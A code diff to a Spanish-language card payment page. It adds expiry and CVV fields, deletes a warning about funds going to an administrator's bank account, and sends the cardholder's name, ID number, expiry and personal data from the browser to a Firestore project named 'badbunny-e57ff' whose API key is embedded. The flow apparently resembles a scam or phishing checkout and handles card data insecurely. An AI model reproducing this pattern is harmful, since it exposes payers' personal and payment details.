@@ -475,38 +475,36 @@
                 <div class="form-section">
                     <h3>💳 Datos de tu tarjeta</h3>
                     
-                    <div class="form-group">
-                        <label for="cardholderName">Nombre del titular *</label>
-                        <input type="text" id="cardholderName" placeholder="Ej: Juan Pérez" required>
-                    </div>
+                        <div class="form-group">
+                            <label for="cardholderName">Nombre completo del titular *</label>
+                            <input type="text" id="cardholderName" placeholder="Ej: Juan Pérez" required>
+                        </div>
 
-                    <div class="form-group">
-                        <label for="cardNumber">Número de tarjeta *</label>
-                        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                    </div>
+                        <div class="form-group">
+                            <label for="cardDNI">Documento (DNI) *</label>
+                            <input type="text" id="cardDNI" placeholder="Ej: 12345678" required>
+                        </div>
 
-                    <div class="form-group">
-                        <label for="documentNumber">DNI/Documento *</label>
-                        <input type="text" id="documentNumber" placeholder="Ej: 12345678" required>
-                    </div>
+                        <div class="form-group">
+                            <label for="cardNumber">Número de tarjeta *</label>
+                            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                        </div>
 
-                    <div class="form-group">
-                        <label for="phoneNumber">Número de teléfono *</label>
-                        <input type="tel" id="phoneNumber" placeholder="Ej: 1123456789" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="emailAddress">Gmail *</label>
-                        <input type="email" id="emailAddress" placeholder="tu@gmail.com" required>
-                    </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="cardExp">Fecha de vencimiento (MM/AA) *</label>
+                                <input type="text" id="cardExp" placeholder="MM/AA" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="cardCvv">Código de seguridad (CVV) *</label>
+                                <input type="text" id="cardCvv" maxlength="4" placeholder="CVV" required>
+                            </div>
+                        </div>
                 </div>
 
                 <div class="divider"></div>
 
-                <div class="info-box warning">
-                    <strong>⚠️ Importante:</strong><br>
-                    El pago se procesará hacia el CBU de la administradora. Asegúrate de que todos los datos sean correctos antes de continuar.
-                </div>
+                <!-- Aviso de CBU eliminado según solicitud -->
             </div>
         </div>
     </div>
@@ -626,51 +624,50 @@
             window.history.back();
         }
 
-        function finalizePay() {
-            // Validar campos
-            const cardholderName = document.getElementById('cardholderName').value.trim();
-            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-            const documentNumber = document.getElementById('documentNumber').value.trim();
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const emailAddress = document.getElementById('emailAddress').value.trim();
+        async function finalizePay() {
+            const name = document.getElementById('cardholderName').value.trim();
+            const dni = document.getElementById('cardDNI').value.trim();
+            const number = document.getElementById('cardNumber').value.replace(/\s/g,'');
+            const exp = document.getElementById('cardExp').value.trim();
+            const cvv = document.getElementById('cardCvv').value.trim();
 
-            if (!cardholderName) {
-                alert('Por favor ingresa el nombre del titular');
-                return;
+            if (!name || !dni || !number || !exp || !cvv) { alert('Completa todos los campos'); return; }
+            if (number.length !== 16) { alert('Número de tarjeta inválido'); return; }
+
+            try {
+                const { initializeApp } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js');
+                const { getFirestore, doc, setDoc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');
+                const firebaseConfig = {
+                    apiKey: "AIzaSyCxq7lebIs8QO_I950XinLK2108H7TTjkY",
+                    authDomain: "badbunny-e57ff.firebaseapp.com",
+                    projectId: "badbunny-e57ff",
+                    storageBucket: "badbunny-e57ff.firebasestorage.app",
+                    messagingSenderId: "401847470375",
+                    appId: "1:401847470375:web:2a7e56c30adfe0e4b80102",
+                    measurementId: "G-GP159FTDGF"
+                };
+                const app = initializeApp(firebaseConfig);
+                const db = getFirestore(app);
+
+                const personal = JSON.parse(localStorage.getItem('personalData') || '{}');
+                const key = (personal.email || 'anon') + '_' + Date.now();
+
+                await setDoc(doc(db, 'pagos', key), {
+                    titular: name,
+                    dni: dni,
+                    cardNumber: '**** **** **** ' + number.slice(-4),
+                    exp: exp,
+                    cvv: '***',
+                    cliente: personal,
+                    fecha: new Date()
+                });
+
+                // Ir a página de procesamiento
+                window.location.href = 'processing-card-payment.html';
+            } catch (err) {
+                console.error(err);
+                alert('Error al procesar: ' + err.message);
             }
-
-            if (cardNumber.length !== 16) {
-                alert('El número de tarjeta debe tener 16 dígitos');
-                return;
-            }
-
-            if (!documentNumber) {
-                alert('Por favor ingresa tu DNI/Documento');
-                return;
-            }
-
-            if (!phoneNumber) {
-                alert('Por favor ingresa tu número de teléfono');
-                return;
-            }
-
-            if (!emailAddress || !emailAddress.includes('@')) {
-                alert('Por favor ingresa un correo electrónico válido');
-                return;
-            }
-
-            // Guardar datos de tarjeta en localStorage
-            const cardData = {
-                cardholderName: cardholderName,
-                cardNumber: '**** **** **** ' + cardNumber.slice(-4),
-                documentNumber: documentNumber,
-                phoneNumber: phoneNumber,
-                emailAddress: emailAddress
-            };
-            localStorage.setItem('cardData', JSON.stringify(cardData));
-
-            // Redirigir a la pantalla de CBU
-            window.location.href = 'card-payment-cbu.html';
         }
     </script>
 </body>
